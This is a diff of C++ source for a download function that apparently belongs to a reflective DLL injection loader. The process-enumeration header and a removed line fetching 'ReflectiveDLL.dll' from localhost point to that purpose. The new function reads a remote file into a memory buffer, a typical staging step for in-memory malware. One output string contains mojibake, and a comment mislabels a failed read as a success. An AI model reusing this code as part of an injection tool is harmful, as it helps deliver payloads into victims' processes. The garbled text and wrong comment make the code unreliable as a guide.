@@ -6,38 +6,73 @@
 #include <filesystem>
 #include <TlHelp32.h>
 
-std::vector<char> download_from_url(_in_ const char* url)
+std::vector<char> download_from_url(_in_ const char* url) 
 {
-
-    IStream* stream;
     std::vector<char> buffer;
+    IStream* stream = nullptr;
 
-	DeleteUrlCacheEntry(L"http://127.0.0.1/ReflectiveDLL.dll");
-    if (SUCCEEDED(URLOpenBlockingStreamA(reinterpret_cast<LPUNKNOWN>(0), url, &stream, 0, 0))) {
+    DeleteUrlCacheEntryA(url);
 
-        std::cout << "[-] Error occured while downloading the file";
+    HRESULT hr = URLOpenBlockingStreamA(
+        nullptr,           // nullptr
+        url,               // URL
+        &stream,           // IStream interface
+        0,                 // Reserved
+        nullptr            // IBindStatusCallback
+    );
 
-        return buffer;
-    }
+    if (SUCCEEDED(hr) && stream) {
+        std::cout << "[+] Successfully connected to the URL: " << url << std::endl;
 
-    buffer.resize(100);
+        char readBuffer[4096];
+        DWORD bytesRead = 0;
 
-    unsigned long bytes_read;
-    int total_bytes = 0;
+        while (true) {
+            hr = stream->Read(readBuffer, sizeof(readBuffer), &bytesRead);
 
-    while (true) {
-        stream->Read(buffer.data() + buffer.size() - 100, 100, &bytes_read);
-        if (0U == bytes_read)
-        {
-            break;
+            if (hr != S_OK && bytesRead == 0) {
+                break;  // read successfully.
+            }
+
+            if (bytesRead > 0) {
+                buffer.insert(buffer.end(), readBuffer, readBuffer + bytesRead);
+            }
+
+            if (hr != S_OK) {
+                break;  // read failed. 
+            }
         }
 
-        buffer.resize(buffer.size() + 100);
-        total_bytes += bytes_read;
-    }
+        stream->Release();
 
-    stream->Release();
-    buffer.erase(buffer.begin() + total_bytes, buffer.end());
+        if (!buffer.empty()) {
+            std::cout << "[+] Download completed, size: " << buffer.size() << " ×Ö½Ú" << std::endl;
+        }
+        else {
+            std::cout << "[-] Download completed, but the data is empty" << std::endl;
+        }
+
+    }
+    else {
+        std::cout << "[-] Connecting URL failed: " << url << std::endl;
+        std::cout << "[-] HRESULT: 0x" << std::hex << hr << std::dec << std::endl;
+
+        LPSTR errorMessage = nullptr;
+        FormatMessageA(
+            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+            nullptr,
+            hr,
+            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+            (LPSTR)&errorMessage,
+            0,
+            nullptr
+        );
+
+        if (errorMessage) {
+            std::cout << "[-] Download Error: " << errorMessage << std::endl;
+            LocalFree(errorMessage);
+        }
+    }
 
     return buffer;
 }
